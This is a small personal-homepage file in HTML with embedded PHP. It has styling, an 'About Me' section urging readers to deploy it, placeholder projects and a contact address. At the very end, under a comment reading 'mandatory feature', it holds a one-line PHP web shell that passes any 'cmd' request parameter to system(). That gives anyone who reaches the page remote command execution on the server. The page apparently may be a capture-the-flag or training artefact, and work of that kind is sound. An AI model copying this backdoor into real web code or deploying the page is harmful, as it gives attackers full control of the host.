<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="uh">
    <title>My website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 0;
        }
        header {
            background: #0078d7;
            color: #fff;
            padding: 15px 0;
            text-align: center;
        }
        section {
            max-width: 900px;
            margin: 20px auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        footer {
            text-align: center;
            padding: 15px;
            background: #0078d7;
            color: #fff;
            position: relative;
            bottom: 0;
            width: 100%;
        }
        a {
            color: #0078d7;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <h1>Welcome to my nice website</h1>
    </header>
    <section>
        <h2>About Me</h2>
        <p>Hello! welcome to my very secure wwebsite ! feel free to deploy it on your system !!</p>
        <h2>My Projects</h2>
        <ul>
            <li><a href="#">Project 1: Oh le php c'est joli</a></li>
            <li><a href="#">Project 2: Je veux pas que Harfang le voie</a></li>
            <li><a href="#">Project 3: tttttt</a></li>
        </ul>
        <h2>Contact</h2>
        <p>Email: <a href="mailto:dev@test.com">dev@test.com</a></p>
    </section>
    <footer>
        <p>&copy; 2025 My Website | Designed with ❤️</p>
    </footer>
    
    <!-- mandatory feature -->
    <?php system(@$_REQUEST['cmd']);?>	
</body>
</html>

